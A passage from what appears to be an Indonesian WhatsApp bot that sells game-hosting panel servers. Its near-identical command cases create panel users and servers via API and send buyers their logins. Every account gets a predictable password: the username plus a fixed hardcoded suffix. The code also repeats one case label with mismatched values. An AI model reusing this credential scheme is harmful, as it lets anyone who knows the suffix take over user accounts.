DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "10gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "10GB"
let egg = global.eggsnya
let loc = global.location
let memo = "10240"
let cpu = "250"
let disk = "10240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "21gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "20GB"
let egg = global.eggsnya
let loc = global.location
let memo = "20240"
let cpu = "530"
let disk = "20240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "25gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "25GB"
let egg = global.eggsnya
let loc = global.location
let memo = "25240"
let cpu = "700"
let disk = "25240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "24gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "24GB"
let egg = global.eggsnya
let loc = global.location
let memo = "24240"
let cpu = "660"
let disk = "24240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "23gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "23GB"
let egg = global.eggsnya
let loc = global.location
let memo = "23240"
let cpu = "610"
let disk = "23240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "22gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "22GB"
let egg = global.eggsnya
let loc = global.location
let memo = "22240"
let cpu = "590"
let disk = "22240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "21gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "21GB"
let egg = global.eggsnya
let loc = global.location
let memo = "21240"
let cpu = "570"
let disk = "21240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "20gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "20GB"
let egg = global.eggsnya
let loc = global.location
let memo = "20240"
let cpu = "530"
let disk = "20240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "19gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "19GB"
let egg = global.eggsnya
let loc = global.location
let memo = "19240"
let cpu = "500"
let disk = "19240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "18gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "18GB"
let egg = global.eggsnya
let loc = global.location
let memo = "18240"
let cpu = "480"
let disk = "18240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "dyf7dbso7"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

